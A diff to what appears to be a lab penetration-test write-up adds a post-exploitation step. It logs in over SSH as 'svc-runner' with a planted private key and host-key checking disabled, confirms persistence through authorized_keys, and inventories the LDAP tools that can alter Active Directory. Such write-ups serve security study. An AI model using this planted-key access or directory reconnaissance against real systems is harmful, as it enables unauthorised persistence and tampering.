@@ -3075,6 +3075,69 @@ uid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain us
 <div style="page-break-after: always;"></div>
 
 ## 4. Post-Exploitation
+
+### 4. Privilege Escalation
+
+#### 4.1 — Establish an interactive session as `svc-runner` and inventory directory tooling
+
+**Why this step:** The planted SSH key grants access as a domain account with membership in a non-default group. Obtain an interactive session and determine what tooling is available on the host for querying and modifying Active Directory.
+
+**Commands:**
+
+bash
+
+```bash
+ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3
+```
+
+bash
+
+```bash
+which ldapsearch bloodyAD nxc netexec python3; ls /usr/bin | grep -i ldap
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`ssh -i /tmp/.runner_key`|Authenticate with the planted private key|Log in as the runner account|
+|`which <tools>`|Report the path of each named binary if present|Check which AD tools are installed|
+|`ls /usr/bin \| grep -i ldap`|List all LDAP-related binaries|Find the full OpenLDAP client suite|
+
+**Result:**
+
+```
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-136-generic x86_64)
+Last login: Wed Jul 29 12:55:25 2026 from 172.16.20.3
+svc-runner@SRV01:~$
+```
+
+```
+/usr/bin/ldapsearch
+/usr/bin/python3
+ldapadd
+ldapcompare
+ldapdelete
+ldapexop
+ldapmodify
+ldapmodrdn
+ldappasswd
+ldapsearch
+ldapurl
+ldapwhoami
+```
+
+**What this gives you:** A stable session as a domain account, with native tooling for both reading and writing to Active Directory.
+
+**Key findings:**
+
+- Interactive SSH session established as `svc-runner` on SRV01. Persistence via `authorized_keys` is confirmed working and does not depend on re-triggering the workflow.
+- **The complete OpenLDAP client suite is installed**, including write-capable tools: `ldapadd` (create objects), `ldapmodify` (alter attributes), `ldappasswd` (change passwords), `ldapdelete` (remove objects). Directory modification is possible without transferring any tooling to the host.
+- `ldapwhoami` is available for confirming the authenticated identity of an LDAP bind — useful for verifying Kerberos-based binds succeed.
+- Neither `bloodyAD` nor `netexec` is present, and the host has no internet egress. All directory work must use the native LDAP utilities.
+- `python3` is available for scripting where the LDAP tools are awkward.
+
+**Next:** Determine whether `svc-runner` holds a Kerberos ticket, then enumerate the directory for the permissions granted by the `servicehandler` group.
 <div align="center">
 <br>
 <br>
